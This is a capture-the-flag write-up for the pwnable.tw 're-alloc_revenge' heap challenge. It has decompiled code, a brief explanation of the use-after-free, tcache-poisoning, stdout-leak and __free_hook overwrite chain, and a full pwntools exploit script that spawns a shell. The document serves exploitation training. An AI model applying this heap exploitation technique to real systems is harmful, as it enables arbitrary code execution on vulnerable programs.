# Re-alloc_revenge

## checksec

```bash
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

## IDA

**add**

```c
int allocate()
{
  _BYTE *v0; // rax
  unsigned __int64 v2; // [rsp+0h] [rbp-20h]
  unsigned __int64 size; // [rsp+8h] [rbp-18h]
  void *v4; // [rsp+18h] [rbp-8h]

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 || heap[v2] )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    printf("Size:");
    size = read_long();
    if ( size <= 0x78 )
    {
      v4 = malloc(size);                        // ！！！！
      if ( v4 )
      {
        heap[v2] = v4;
        printf("Data:");
        v0 = (_BYTE *)(heap[v2] + read_input(heap[v2], (unsigned int)size));
        *v0 = 0;
      }
      else
      {
        LODWORD(v0) = puts("alloc error");
      }
    }
    else
    {
      LODWORD(v0) = puts("Too large!");
    }
  }
  return (int)v0;
}
```

保护全开了，在申请的时候也使用`malloc`这意味着申请会影响`tcache`布局。但是漏洞点仍然是同样的，有UAF。

通过UAF进行double free然后进行`tcache poisoning`，控制`tcache struct`，当`new_size < old_size`时，chunk会被切割。所以通过对`tcache struct`进行适当的切割可以让其`next*`指针域出现`main_arena`的指针，这时从`unsorted bin`申请一个chunk，就可以控制对这块区域进行写，覆写其指针低2字节，使其指向`IO_stdout`进行leak。之后，再覆写`free_hook`为`system`从而get shell。

## exp

```python
from pwn import *
#from LibcSearcher import LibcSearcher

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context(arch = 'amd64' , os = 'linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

binary = './re-alloc_revenge'
sh = process(binary)
# sh = remote('chall.pwnable.tw', 10310)

elf = ELF(binary,checksec=False)
libc = ELF('libc.so',checksec=False)

def add(idx,size,data):
	sh.sendlineafter('choice: ','1')
	sh.sendlineafter('Index:',str(idx))
	sh.sendlineafter('Size:',str(size))
	sh.sendafter('Data:',data)

def edit(idx,size,data):
	sh.sendlineafter('choice: ','2')
	sh.sendlineafter('Index:',str(idx))
	sh.sendlineafter('Size:',str(size))
	if size != 0:
		sh.sendafter('Data:',data)

def dele(idx):
	sh.sendlineafter('choice: ','3')
	sh.sendlineafter('Index:',str(idx))
 

while True:
    try:
        add(0,0x40,'a'*0x10)
        edit(0,0,'') # free
        edit(0,0x40,'a'*0x10)
        edit(0,0,'') # free
        # gdb.attach(sh)
        edit(0,0x40,p16(0x7010))

        add(1,0x40,'a'*0x10)
        edit(1,0x50,'a'*0x10)
        dele(0)
        edit(1,0x50,'a'*0x10)
        dele(1)

        add(0,0x40,'\xff'*4+'\x00'*2+'\xff'*(0x40-6))
        edit(0,0x50,'\xff'*4+'\x00'*2+'\xff'*(0x40-6))

        add(1,0x30,'N')
        dele(0)
        edit(1,0x30,'N'*8+p16(0x7758))

        add(0,0x60,'/bin/sh\x00'+p64(0xfbad1800)+p64(0)*3)

        libc_addr = u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
        libcbase = libc_addr - libc.sym['_IO_2_1_stdin_']
        leak('libcbase', libcbase)
        system = libcbase + libc.sym['system']
        free_hook = libcbase + libc.sym['__free_hook']
        log.success('libc addr get!')

        edit(1,0x30,p64(free_hook)*6)
        dele(1)
        add(1,0x60,p64(system))
        dele(0)

        sh.interactive()
    except EOFError:
        sh.close()
```

爆破真是恶心！